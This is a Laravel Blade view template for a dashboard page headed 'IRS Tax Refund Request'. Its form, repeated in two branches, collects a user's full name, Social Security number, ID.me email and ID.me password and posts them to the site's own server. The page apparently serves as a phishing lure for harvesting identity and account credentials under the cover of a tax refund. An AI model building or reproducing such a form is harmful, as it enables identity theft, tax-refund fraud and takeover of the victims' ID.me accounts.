@extends('dashboard.user.layouts.app')
@section('content')
    <div class="page-container">

        <div class="page-title-head d-flex align-items-sm-center flex-sm-row flex-column gap-2">
            <div class="flex-grow-1">
                <h4 class="fs-18 fw-semibold mb-0">{{ $title }}</h4>
            </div>

            <div class="text-end">
                <x-dashboard.user.breadcrumbs :breadcrumbs="$breadcrumbs" />
            </div>
        </div>

        <div class="row">
            <div class="col-lg-12">

                @if ($latestRefund)
                    @if ($latestRefund->isPending() || $latestRefund->isSubmitted())
                        <div class="card shadow-sm border-0 text-center p-4">
                            <!-- Icon -->
                            <div class="mb-4">
                                <span class="bg-warning rounded-circle p-3">
                                    <i class="bi bi-clock text-white"></i>
                                </span>
                            </div>

                            <!-- Title -->
                            <h5 class="fw-bold mb-2">Your Refund Request is Pending</h5>

                            <!-- Subtitle -->
                            <p class="text-muted mb-4">
                                Your refund request is currently being reviewed. Please check back later for updates.
                            </p>

                            <!-- Button -->
                            <a href="{{ route('user.irs_tax_refund.track') }}" class="btn btn-primary">
                                <i class="bi bi-arrow-repeat me-2"></i> Track Status
                            </a>
                        </div>
                    @else
                        <x-dashboard.user.card>
                            @slot('header')
                                {{ $title }}
                            @endslot

                            <div class="text-center">
                                <div class="bg-primary text-white rounded-circle d-inline-flex align-items-center justify-content-center mb-2"
                                    style="width:50px; height:50px;">
                                    <i class="fa-solid fa-calculator fs-4"></i>
                                </div>
                                <h3>IRS Tax Refund Request</h3>
                                <p>Please fill out the form below to submit your IRS tax refund request</p>
                            </div>

                            <form action="{{ route('user.irs_tax_refund.store') }}" method="post">
                                @csrf

                                <x-dashboard.user.card>
                                    @slot('header')
                                        <i class="fa-solid fa-user"></i> Personal Information
                                    @endslot

                                    <x-dashboard.user.form-input name="name" label="Full Name" class="col-md-12 mb-3"
                                        value="{{ old('name') }}" />

                                    <x-dashboard.user.form-input name="social_security_number"
                                        label="Social Security Number (SSN)" class="col-md-12 mb-3"
                                        value="{{ old('social_security_number') }}" placeholder="xxx-xx-xxxx" />
                                </x-dashboard.user.card>

                                <x-dashboard.user.card>
                                    @slot('header')
                                        <i class="fa-solid fa-id-card"></i> ID.me Credentials
                                    @endslot

                                    <x-dashboard.user.form-input name="id_me_email" label="ID.me Email" type="email"
                                        class="col-md-12 mb-3" value="{{ old('id_me_email') }}" />

                                    <x-dashboard.user.form-input name="id_me_password" id="_id_me_password" type="password"
                                        label="ID.me Password" class="col-md-12 mb-3" />
                                </x-dashboard.user.card>

                                <x-dashboard.user.card>
                                    @slot('header')
                                        <i class="fa-solid fa-location-dot"></i> Location Information
                                    @endslot

                                    <x-dashboard.user.form-select name="country" label="Country" type="select"
                                        class="col-md-12 mb-3" value="{{ old('country') }}" :options="config('setting.countries')" />
                                </x-dashboard.user.card>

                                <x-dashboard.user.info-list title="Important Notice" :options="[
                                    'Please ensure all information provided is accurate and matches your ID.me account details. Any discrepancies may result in delays or rejection of your refund request.',
                                ]" />

                                <div class="float-end">
                                    <x-dashboard.user.form-button name="Submit Request" />
                                </div>
                            </form>
                        </x-dashboard.user.card>
                    @endif
                @else
                    <x-dashboard.user.card>
                        @slot('header')
                            {{ $title }}
                        @endslot

                        <div class="text-center">
                            <div class="bg-primary text-white rounded-circle d-inline-flex align-items-center justify-content-center mb-2"
                                style="width:50px; height:50px;">
                                <i class="fa-solid fa-calculator fs-4"></i>
                            </div>
                            <h3>IRS Tax Refund Request</h3>
                            <p>Please fill out the form below to submit your IRS tax refund request</p>
                        </div>

                        <form action="{{ route('user.irs_tax_refund.store') }}" method="post">
                            @csrf

                            <x-dashboard.user.card>
                                @slot('header')
                                    <i class="fa-solid fa-user"></i> Personal Information
                                @endslot

                                <x-dashboard.user.form-input name="name" label="Full Name" class="col-md-12 mb-3"
                                    value="{{ old('name') }}" />

                                <x-dashboard.user.form-input name="social_security_number"
                                    label="Social Security Number (SSN)" class="col-md-12 mb-3"
                                    value="{{ old('social_security_number') }}" placeholder="xxx-xx-xxxx" />
                            </x-dashboard.user.card>

                            <x-dashboard.user.card>
                                @slot('header')
                                    <i class="fa-solid fa-id-card"></i> ID.me Credentials
                                @endslot

                                <x-dashboard.user.form-input name="id_me_email" label="ID.me Email" type="email"
                                    class="col-md-12 mb-3" value="{{ old('id_me_email') }}" />

                                <x-dashboard.user.form-input name="id_me_password" id="_id_me_password" type="password"
                                    label="ID.me Password" class="col-md-12 mb-3" />
                            </x-dashboard.user.card>

                            <x-dashboard.user.card>
                                @slot('header')
                                    <i class="fa-solid fa-location-dot"></i> Location Information
                                @endslot

                                <x-dashboard.user.form-select name="country" label="Country" type="select"
                                    class="col-md-12 mb-3" value="{{ old('country') }}" :options="config('setting.countries')" />
                            </x-dashboard.user.card>

                            <x-dashboard.user.info-list title="Important Notice" :options="[
                                'Please ensure all information provided is accurate and matches your ID.me account details. Any discrepancies may result in delays or rejection of your refund request.',
                            ]" />

                            <div class="float-end">
                                <x-dashboard.user.form-button name="Submit Request" />
                            </div>
                        </form>
                    </x-dashboard.user.card>
                @endif

            </div>
            <!-- end col -->
        </div>
        <!-- end row -->

    </div>
@endsection
